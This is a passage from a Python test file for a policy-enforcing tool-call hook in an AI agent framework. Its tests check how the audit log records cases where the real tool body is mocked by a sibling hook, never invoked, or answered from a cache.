    assert result == "mocked, never reached the real body"
    assert reached == []

    entries = root.audit_log().entries
    outcomes = [e for e in entries if e["event"] == "outcome"]
    assert outcomes and outcomes[0]["body_state"] == BodyState.RETURNED  # the documented residual


def test_v2_strict_mode_never_fabricates_when_this_hook_is_inner_and_never_reached():
    """The SAFE direction: if a sibling is listed first (outer) and never calls this hook at
    all (e.g. it fully emulates the tool itself), this hook's own guarded_tool_hook body simply
    never runs -- nothing is authorized, nothing is fabricated. Modeled directly: this hook is
    just never invoked."""
    root, registry = _v2_summarizer_registry()
    guarded_tool_hook(registry, SUMMARIZER_POLICIES, strict_single_hook=True)  # never called

    entries = root.audit_log().entries
    assert [e for e in entries if e["event"] in ("allow", "outcome")] == []


def test_v2_strict_mode_cache_short_circuit_is_a_documented_residual_not_a_sibling():
    """Agno's OWN entrypoint dispatch (`execute_entrypoint` inside `_build_nested_execution_
    chain`) can itself return a cached result without calling the real function, EVEN when this
    hook is the only/innermost one -- not a sibling hook, baked into the same call this hook's
    own `function_call` argument resolves into. Modeled directly: `function_call` behaves like a
    cache hit (returns a stored value without any real side effect), same shape and same
    residual as the sibling-short-circuit case above -- this hook has no way to distinguish
    them, by design (both are "function_call was invoked and returned a value")."""
    root, registry = _v2_summarizer_registry()
    hook = guarded_tool_hook(registry, SUMMARIZER_POLICIES, strict_single_hook=True)
    real_body_ran = []

    def cache_hit(**kw):
        # No call to the real crm_query -- this stands in for execute_entrypoint's own
        # `return _detached(cached_result)` short-circuit.
        return "read 10 rows"  # the cached value from a PRIOR real invocation

    result = hook(
        function_name="crm_query",
        function_call=cache_hit,
        arguments={"rows": 10},
        agent=_Principal("summarizer"),
        team=None,
    )
    assert result == "read 10 rows"
    assert real_body_ran == []  # the body did not run THIS time -- the cache answered

    entries = root.audit_log().entries
    outcome = next(e for e in entries if e["event"] == "outcome")
    assert outcome["body_state"] == BodyState.RETURNED  # the documented residual, not a crash
